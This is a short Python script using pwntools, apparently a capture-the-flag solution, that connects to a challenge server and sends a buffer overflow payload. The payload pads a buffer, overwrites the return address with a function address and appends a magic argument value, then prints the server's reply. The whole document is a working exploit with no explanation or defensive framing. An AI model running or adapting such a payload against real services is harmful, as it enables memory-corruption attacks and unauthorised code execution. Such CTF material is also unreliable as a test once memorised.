from pwn import *

host = "isc2024.1337.cx"
port = 10150

global_magix = 0x31337EB9
func_addr = 0x080497f8

conn = remote(host, port)

message = b"\xaa\xaa\xaa\xaa" + b"A" * 89 + b'\xf8\x97\x04\x08' + b"D" * 4 + b'\xb9\x7e\x33\x31'
conn.send(message)
conn.shutdown("send")
response = conn.recvall()
try:
    print(response.decode("utf-8"))
except UnicodeDecodeError:
    print(response)